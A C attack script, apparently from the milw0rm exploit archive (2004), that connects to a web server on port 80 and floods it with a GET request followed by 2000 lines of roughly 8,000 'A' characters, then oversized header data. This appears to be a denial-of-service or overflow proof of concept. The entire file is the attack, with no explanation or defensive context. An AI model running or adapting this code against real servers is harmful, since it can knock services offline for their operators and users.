#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

#define A 0x41
#define PORT 80

struct sockaddr_in hrm;

int conn(char *ip)
{
int sockfd;
hrm.sin_family = AF_INET;
hrm.sin_port = htons(PORT);
hrm.sin_addr.s_addr = inet_addr(ip);
bzero(&(hrm.sin_zero),8);
sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&hrm,sizeof(struct sockaddr)))<0)
{
perror("connect");
exit(0);
}
return sockfd;
}
int main(int argc, char *argv[])
{
int i,x;
char buf[300],a1[8132],a2[50],host[100],content[100];
char *ip=argv[1],*new=malloc(sizeof(int));
sprintf(new,"\r\n");
memset(a1,'\0',8132);
memset(host,'\0',100);
memset(content,'\0',100);
a1[0] = ' ';
for(i=1;i<8132;i++)
a1[i] = A;
if(argc<2)
{
printf("%s: IP\n",argv[0]);
exit(0);
}
x = conn(ip);
printf("[x] Connected to: %s.\n",inet_ntoa(hrm.sin_addr));
sprintf(host,"Host: %s\r\n",argv[1]);
sprintf(content,"Content-Length: 50\r\n");
sprintf(buf,"GET / HTTP/1.0\r\n");
write(x,buf,strlen(buf));
printf("[x] Sending buffer...");
for(i=0;i<2000;i++)
{
write(x,a1,strlen(a1));
write(x,new,strlen(new));
}
memset(buf,'\0',300);
strcpy(buf,host);
strcat(buf,content);
for(i=0;i<50;i++)
a2[i] = A;
strcat(buf,a2);
strcat(buf,"\r\n\r\n");
write(x,buf,strlen(buf));
printf("done!\n");
close(x);

}

// milw0rm.com [2004-08-02]